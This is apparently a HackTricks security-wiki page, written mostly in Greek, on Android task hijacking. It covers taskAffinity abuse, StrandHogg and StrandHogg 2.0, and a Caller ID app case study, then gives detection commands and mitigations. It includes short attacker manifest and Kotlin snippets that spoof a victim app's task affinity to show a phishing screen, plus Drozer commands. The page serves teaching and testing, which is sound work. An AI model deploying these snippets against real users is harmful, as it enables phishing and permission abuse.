# Android Task Hijacking

{{#include ../../banners/hacktricks-training.md}}

## Task, Back Stack and Foreground Activities

Στο Android, μια **εργασία** είναι ουσιαστικά ένα σύνολο δραστηριοτήτων με τις οποίες οι χρήστες αλληλεπιδρούν για να ολοκληρώσουν μια συγκεκριμένη εργασία, οργανωμένες μέσα σε μια **στοίβα επιστροφής**. Αυτή η στοίβα παραγγέλνει τις δραστηριότητες με βάση το πότε άνοιξαν, με την πιο πρόσφατη δραστηριότητα να εμφανίζεται στην κορυφή ως **δραστηριότητα προσκηνίου**. Σε οποιαδήποτε στιγμή, μόνο αυτή η δραστηριότητα είναι ορατή στην οθόνη, κάνοντάς την μέρος της **εργασίας προσκηνίου**.

Ακολουθεί μια γρήγορη ανάλυση των μεταβάσεων δραστηριοτήτων:

- **Δραστηριότητα 1** ξεκινά ως η μοναδική δραστηριότητα στο προσκήνιο.
- Η εκκίνηση της **Δραστηριότητας 2** σπρώχνει τη **Δραστηριότητα 1** στη στοίβα επιστροφής, φέρνοντας τη **Δραστηριότητα 2** στο προσκήνιο.
- Η εκκίνηση της **Δραστηριότητας 3** μετακινεί τη **Δραστηριότητα 1** και τη **Δραστηριότητα 2** πιο πίσω στη στοίβα, με τη **Δραστηριότητα 3** τώρα μπροστά.
- Το κλείσιμο της **Δραστηριότητας 3** φέρνει τη **Δραστηριότητα 2** πίσω στο προσκήνιο, επιδεικνύοντας τον απλοποιημένο μηχανισμό πλοήγησης εργασιών του Android.

![https://developer.android.com/images/fundamentals/diagram_backstack.png](<../../images/image (698).png>)

---

## Task affinity attacks

`taskAffinity` λέει στο Android σε ποια εργασία θα *προτιμούσε* να ανήκει μια `Activity`. Όταν δύο δραστηριότητες μοιράζονται την ίδια συγγένεια, **το Android επιτρέπεται να τις συγχωνεύσει μέσα στην ίδια στοίβα επιστροφής ακόμα και αν προέρχονται από διαφορετικά APKs**.

Αν ένας επιτιθέμενος μπορεί να τοποθετήσει μια κακόβουλη δραστηριότητα στη **ρίζα** αυτής της στοίβας, κάθε φορά που το θύμα ανοίγει την νόμιμη εφαρμογή, η κακόβουλη διεπαφή θα είναι το πρώτο πράγμα που βλέπει ο χρήστης – τέλειο για phishing ή καταχρηστικά αιτήματα δικαιωμάτων.

Η επιφάνεια επίθεσης είναι ευρύτερη από ό,τι νομίζουν πολλοί προγραμματιστές, επειδή **κάθε δραστηριότητα κληρονομεί αυτόματα μια συγγένεια ίση με το όνομα του πακέτου εφαρμογής** (εκτός αν ο προγραμματιστής ορίσει `android:taskAffinity=""`). Επομένως, *μη κάνοντας τίποτα* αφήνει ήδη την εφαρμογή ανοιχτή σε hijacking εργασιών σε εκδόσεις Android πριν από την 11.

### Classic "singleTask / StrandHogg" scenario

1. Ο επιτιθέμενος δηλώνει μια δραστηριότητα με:
```xml
<activity android:name=".EvilActivity"
android:exported="true"
android:taskAffinity="com.victim.package"
android:launchMode="singleTask" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
2. Η κακόβουλη εφαρμογή ξεκινά μία φορά ώστε η εργασία (με την παραποιημένη συγγένεια) να υπάρχει στις πρόσφατες εργασίες.
3. Όταν ο χρήστης ανοίξει αργότερα την πραγματική εφαρμογή, το Android βρίσκει ότι υπάρχει ήδη μια εργασία της οποίας η **ρίζα συγγένεια ταιριάζει με το πακέτο** και απλά φέρνει αυτή την εργασία στο προσκήνιο.
4. Η διεπαφή του επιτιθέμενου εμφανίζεται πρώτη.

### Default–Affinity (no `singleTask`) variant  – Caller ID case study

Η ευπάθεια που αναφέρθηκε στην εφαρμογή **Caller ID (caller.id.phone.number.block)** δείχνει ότι η επίθεση *λειτουργεί επίσης* κατά της προεπιλεγμένης λειτουργίας εκκίνησης `standard`:

1. Η εφαρμογή του επιτιθέμενου δημιουργεί μια ψεύτικη ριζική δραστηριότητα και αμέσως κρύβει τον εαυτό της:
```kotlin
class HackActivity : AppCompatActivity() {
override fun onCreate(savedInstanceState: Bundle?) {
super.onCreate(savedInstanceState)
moveTaskToBack(true)   // keep the task in recents but out of sight
}
}
```
2. Το μανιφέστο χρειάζεται μόνο να αντιγράψει το πακέτο του θύματος στο `taskAffinity`:
```xml
<activity android:name=".HackActivity"
android:exported="true"
android:taskAffinity="com.caller.id.phone.number.block" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
3. Μόλις ο χρήστης εγκαταστήσει και ανοίξει την κακόβουλη εφαρμογή **μία φορά**, μια εργασία της οποίας η συγγένεια ισούται με το πακέτο του θύματος υπάρχει (αλλά βρίσκεται στο παρασκήνιο).
4. Όταν εκκινείται η πραγματική εφαρμογή Caller ID, το Android επαναχρησιμοποιεί αυτή την εργασία και φέρνει τη `HackActivity` στο προσκήνιο → παράθυρο phishing/κατάχρηση δικαιωμάτων.

> ΣΗΜΕΙΩΣΗ: Ξεκινώντας από το **Android 11 (API 30)**, το σύστημα *δεν* τοποθετεί δύο πακέτα που δεν ανήκουν στο ίδιο UID στην ίδια εργασία από προεπιλογή, μετριάζοντας αυτή τη συγκεκριμένη παραλλαγή. Οι παλαιότερες εκδόσεις παραμένουν ευάλωτες.

---

### StrandHogg 2.0 (CVE-2020-0096) – Reflection-based task hijack

Η ασφάλεια του Google του Μαΐου 2020 διόρθωσε μια πιο προηγμένη παραλλαγή που ονομάζεται **StrandHogg 2.0**. Η εκμετάλλευση **δεν βασίζεται καθόλου στο `taskAffinity`**; αντ' αυτού χρησιμοποιεί *reflection* για να εισάγει δυναμικά τη δραστηριότητα του επιτιθέμενου στην κορυφή *κάθε* τρέχουσας εργασίας, παρακάμπτοντας εντελώς τον περιορισμό “shared-UID” που εισήχθη από το Android 11.

Κύρια σημεία:

* Μια κακόβουλη εφαρμογή μηδενικών δικαιωμάτων μπορεί, μόλις ανοιχτεί, να επαναλάβει τις τρέχουσες εργασίες και να καλέσει κρυφές APIs για να **επαν-γονέψει** τη δική της δραστηριότητα σε οποιαδήποτε εργασία.
* Επειδή η δραστηριότητα εισάγεται μετά την εκτέλεση, ούτε το `launchMode` ούτε η στατική ανάλυση μανιφέστου μπορούν να ανιχνεύσουν την επίθεση εκ των προτέρων.
* Διορθώθηκε με την επιστροφή ενός ελέγχου στο **Android 8.0/8.1/9** (SPL Μαΐου 2020). **Το Android 10 και οι νεότερες εκδόσεις δεν επηρεάζονται.**

Η ανίχνευση σε προ-διορθωμένες συσκευές μπορεί να πραγματοποιηθεί με `adb shell dumpsys activity activities` και παρακολουθώντας για ύποπτες δραστηριότητες των οποίων το όνομα πακέτου διαφέρει από τη *συγγένεια* της εργασίας.

Η μετρίαση για παλαιές συσκευές είναι η ίδια με το κλασικό Task Hijacking **συν** έλεγχο κατά την εκτέλεση (π.χ. καλώντας [`ActivityManager#getRunningTasks`](https://developer.android.com/reference/android/app/ActivityManager#getRunningTasks(int)) και επικυρώνοντας το όνομα του πακέτου σας).

---

## Detection & Exploitation checklist

1. **Static review** – Pull `AndroidManifest.xml` from the target APK and check that each `<activity>` (or the global `<application>` element) contains `android:taskAffinity=""` (empty) **or** a customised value.  Tools such as:
```bash
# Using apkanalyzer (Android SDK)
apkanalyzer manifest print app.apk | grep -i taskaffinity

# Using AXMLPrinter2
java -jar AXMLPrinter2.jar AndroidManifest.xml | grep taskAffinity
```
2. **Dynamic review** – On the device open the target app and list tasks:
```bash
adb shell dumpsys activity activities | grep -A3 "TASK" | grep -E "Root|affinity"
```
A task whose root affinity equals the victim package but whose top activity belongs to a *different* package is a red flag.
3. Craft a malicious app as described above, or use **[Drozer](https://github.com/WithSecureLabs/drozer)**:
```bash
drozer console connect
run app.activity.start --component com.victim/.MainActivity --action android.intent.action.MAIN
run app.activity.info com.victim
```

---

## Mitigation

Οι προγραμματιστές θα πρέπει:

* Να ορίσουν ρητά `android:taskAffinity=""` στο επίπεδο `<application>` (συνιστάται) **ή** να δώσουν σε κάθε δραστηριότητα μια μοναδική, ιδιωτική συγγένεια.
* Για πολύ ευαίσθητες οθόνες, να συνδυάσουν τα παραπάνω με `android:launchMode="singleInstance"` ή σύγχρονα [`setLaunchMode`](https://developer.android.com/reference/android/content/pm/ActivityInfo#launchMode) προστατευτικά.
* Να αναβαθμίσουν την `targetSdkVersion` της εφαρμογής και να επιβάλουν τις συμπεριφορές του **Android 11** όπου οι εργασίες δεν μοιράζονται μεταξύ πακέτων από προεπιλογή.
* Να στοχεύσουν το **Android 12 (API 31) ή υψηλότερο** ώστε το υποχρεωτικό χαρακτηριστικό `android:exported` να αναγκάζει τους προγραμματιστές να ελέγχουν κάθε εξωτερικά προσβάσιμο συστατικό.
* Να εξετάσουν την αυτοάμυνα κατά την εκτέλεση: περιοδικά να ελέγχουν το `ActivityTaskManager` για να διασφαλίσουν ότι το όνομα του πακέτου της κορυφαίας δραστηριότητας ταιριάζει με το δικό τους.

---

## Related UI-Hijacking techniques

Το hijacking εργασιών συχνά συνδυάζεται ή αντικαθίσταται από **tapjacking** (παραπλανητική διεπαφή βασισμένη σε επικάλυψη). Η έρευνα του 2025 **TapTrap** έδειξε ότι πλήρως διαφανείς *δραστηριότητες που οδηγούνται από κινούμενα σχέδια* μπορούν να παρακάμψουν τους περιορισμούς επαφής επικάλυψης που εισήχθησαν στο Android 12–14 και να εξαπατήσουν τους χρήστες να παραχωρήσουν επικίνδυνα δικαιώματα. Ενώ το TapTrap δεν είναι αυστηρά *task* hijacking, ο τελικός στόχος (κλικ phishing) είναι ταυτόσημος – επομένως οι σύγχρονες αξιολογήσεις θα πρέπει να ελέγχουν και τις δύο επιφάνειες επίθεσης.

---

## References

- [https://blog.dixitaditya.com/android-task-hijacking/](https://blog.dixitaditya.com/android-task-hijacking/)
- [https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html](https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html)
- [Android Manifest Misconfiguration Leading to Task Hijacking in Caller ID app](https://github.com/KMov-g/androidapps/blob/main/caller.id.phone.number.block.md)
- [https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06](https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06)
- [Promon – StrandHogg 2.0 (CVE-2020-0096) technical write-up](https://promon.io/resources/downloads/strandhogg-2-0-new-serious-android-vulnerability)
- [USENIX 2025 – TapTrap: Animation-Driven Tapjacking on Android](https://www.usenix.org/conference/usenixsecurity25/presentation/beer)

{{#include ../../banners/hacktricks-training.md}}
